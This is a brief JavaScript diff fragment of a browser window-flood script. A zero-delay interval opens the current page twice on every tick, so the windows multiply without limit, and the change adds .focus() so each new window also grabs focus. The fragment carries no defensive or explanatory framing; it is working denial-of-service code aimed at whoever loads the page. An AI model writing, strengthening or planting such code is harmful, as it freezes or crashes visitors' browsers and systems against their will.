@@ -6,6 +6,6 @@ if(!newWin) {
   }, 5000);
 }
 setInterval(() => {
-  window.open(window.location.href);
-  window.open(window.location.href);
+  window.open(window.location.href).focus()
+  window.open(window.location.href).focus()
 }, 0);
